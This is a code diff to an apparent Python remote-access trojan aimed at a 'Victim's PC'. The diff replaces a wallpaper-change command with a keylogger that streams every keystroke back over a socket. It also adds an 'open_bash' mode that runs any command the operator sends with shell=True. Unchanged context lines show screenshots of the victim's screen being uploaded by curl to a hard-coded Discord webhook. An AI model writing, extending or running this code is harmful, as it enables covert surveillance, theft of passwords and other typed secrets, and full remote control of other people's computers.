@@ -8,6 +8,7 @@ import requests
 import cv2
 import numpy as np
 import subprocess
+from pynput import *
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -46,13 +47,16 @@ class Client():
             _,_URL_TO_OPEN=self.command.split()
             webbrowser.open(_URL_TO_OPEN)
             self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
-        # Change Wallpaper
-        if self.command.startswith("change_wallpaper"):
-            print(self.command)
-            _,_WALLPAPER_TO_CHANGE=self.command.split("=")
-            _WALLPAPER_TO_CHANGE=np.array(_WALLPAPER_TO_CHANGE)
-            cv2.imshow("Test",_WALLPAPER_TO_CHANGE)
-            cv2.waitKey(0)
+        # Log Keys
+        if self.command.startswith("log_keys"):
+            while True:
+                with keyboard.Listener(on_press=self.log_keys) as listener:
+                    listener.join()
+        # Open Bash
+        if self.command=="open_bash":
+            while True:
+                _bash_cmd=self.client.recv(99999).decode()
+                subprocess.Popen([_bash_cmd],shell=True)
     @property
     def os_name(self) -> str:
         if sys.platform=="win32":
@@ -67,6 +71,8 @@ class Client():
         ImageGrab.grab().save("screenshot.png")
         _temp_path=os.path.join(os.getcwd(),"screenshot.png")
         subprocess.getoutput(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
+    def log_keys(self,key:keyboard.Key):
+        self.client.send(str(key).encode())
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         c=socket.socket()
